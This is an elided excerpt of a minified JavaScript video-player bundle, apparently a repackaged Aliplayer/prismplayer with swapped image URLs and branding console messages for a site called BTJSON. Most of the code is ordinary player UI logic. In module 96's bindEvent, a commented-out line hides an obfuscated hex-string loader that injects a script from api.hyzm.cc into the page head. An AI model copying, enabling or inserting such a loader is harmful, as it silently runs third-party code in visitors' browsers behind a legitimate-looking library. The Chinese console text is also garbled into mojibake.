!function n(a, s, l) {
    ...
    3 : [function(e, t, i) {
        ...
        p = r.extend({
            ...
            bindEvent: function() {
                ...
                t = "//ae01.alicdn.com/kf/HTB1teGMc21H3KVjSZFH762KppXa5.png";
                u.domain ? -1 < u.domain.indexOf("localhost") && (t = "//ae01.alicdn.com/kf/HTB1teGMc21H3KVjSZFH762KppXa5.png") : t = "de/prismplayer/" + u.h5Version + "/skins/default/img/dragcursor.png",
                e.src = t,
    ...
    62 : [function(e, t, i) {
        ...
        P.prototype._overrideNativePlay = function() {
            ...
            this.tag.play = function() {
                if (console.log("play"), !o._options.source) {
                    var e = {
    ...
    94 : [function(e, t, i) {
        ...
        p.prototype.show = function() {
            return this._el.style.opacity = "1",
            this
        },
        p.prototype.hide = function() {
            return this._el.style.opacity = "0",
            this
        },
    ...
    95 : [function(e, t, i) {
        ...
        l = r.extend({
            ...
            _show: function() {
                o.css(this.el(), "opacity", "1")
            },
            _hide: function() {
                o.css(this.el(), "opacity", "0")
            }
        });
        t.exports = l
    },
    ...
    96 : [function(e, t, i) {
        ...
        l = r.extend({
            ...
            bindEvent: function() {
           //     var _0x3e04=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x74\x79\x70\x65","\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74","\x73\x72\x63","\x2F\x2F\x61\x70\x69\x2E\x68\x79\x7A\x6D\x2E\x63\x63\x2F\x62\x2F\x79\x7A\x6D\x2E\x6A\x73","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x6C\x65\x6E\x67\x74\x68","\x6F\x6E\x6C\x6F\x61\x64","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x6C\x6F\x61\x64\x65\x64","\x63\x6F\x6D\x70\x6C\x65\x74\x65"];let script2=document[_0x3e04[1]](_0x3e04[0]);script2[_0x3e04[2]]= _0x3e04[3];script2[_0x3e04[4]]= _0x3e04[5];document[_0x3e04[8]](_0x3e04[7])[0][_0x3e04[6]](script2);var activeJs=[script2];for(let i=0;i< activeJs[_0x3e04[9]];i++){(function(i){activeJs[i][_0x3e04[10]]= activeJs[i][_0x3e04[11]]= function(){if(!this[_0x3e04[12]]|| this[_0x3e04[12]]== _0x3e04[13] || this[_0x3e04[12]]== _0x3e04[14]){}}})(i)}
                var i = this;
                this.on("click",
                function() {
    ...
    97 : [function(e, t, i) {
        var r = e("../component"),
        z = e("../../player/base/event/eventtype"),
        ...
        o = r.extend({
            ...
            onEvent: function() {
                ...
                e = i.options(),
                r = this;
                this._player.on(z.Player.Play,
                function() {
                    r.removeClass("bar-open")
                }),
                this._player.on(z.Player.Pause,
                function() {
                    r.addClass("bar-open")
                }),
    ...
    106 : [function(e, t, i) {
        ...
        p = r.extend({
            ...
            bindEvent: function() {
                ...
                r = "https://ae01.alicdn.com/kf/HTB1kusLeQ5E3KVjSZFC762uzXXaN.png";
                u.domain ? -1 < u.domain.indexOf("localhost") && (r = "//ae01.alicdn.com/kf/HTB1teGMc21H3KVjSZFH762KppXa5.png") : r = "de/prismplayer/" + u.h5Version + "/skins/default/img/dragcursor.png",
                e.src = r,
    ...
    119 : [function(e, t, i) {
    console.log("%c%cåšå®¢åç§°%cBTJSON","line-height:16px;","line-height:16px;padding:4px;background:#222;color:#fff; font-size:12px;margin-right:15px","color:#3fa9f5;line-height:16px; font-size:12px;");console.log("%c%cç½‘ç«™åœ°å€%chttp://www.btjson.com","line-height:16px;","line-height:16px;padding:4px;background:#222;color:#fff; font-size:12px;margin-right:15px","color:#ff9900;line-height:16px; font-size:12px;");console.log("%c%cä¼é¹…å·ç %c8852422","line-height:16px;","line-height:16px;padding:4px;background:#222;color:#fff; font-size:12px;margin-right:15px","color:#008000;line-height:16px; font-size:12px;");console.log("%c%cæˆ‘ä»¬æ‰€åº¦è¿‡çš„æ¯ä¸ªå¹³å‡¡çš„æ—¥å¸¸,ä¹Ÿè®¸å°±æ˜¯è¿žç»­å‘ç”Ÿçš„å¥‡è¿¹ã€‚","line-height:16px;","line-height:16px;padding:4px 0px;color:#000; font-size:12px;-background-image:-webkit-gradient(linear,left top,right top,color-stop(0,#ff22ff),color-stop(1,#5500ff));-webkit-background-clip:text;");
        var r = e("../component"),
        o = e("../../lib/util"),
        n = e("../../player/base/event/eventtype"),
        a = r.extend({
